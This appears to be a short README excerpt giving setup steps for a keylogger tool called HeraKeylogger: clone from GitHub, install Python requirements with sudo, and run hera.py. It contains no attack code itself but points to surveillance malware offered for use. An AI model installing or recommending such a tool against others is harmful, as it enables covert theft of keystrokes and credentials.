* PHP
* sudo

### CLONE
```
git clone https://github.com/UndeadSec/HeraKeylogger.git
```

### RUNNING

```
cd HeraKeylogger
```

```
sudo apt-get install python3-pip -y
```

```
sudo pip3 install -r requirements.txt
```

```
python3 hera.py
```
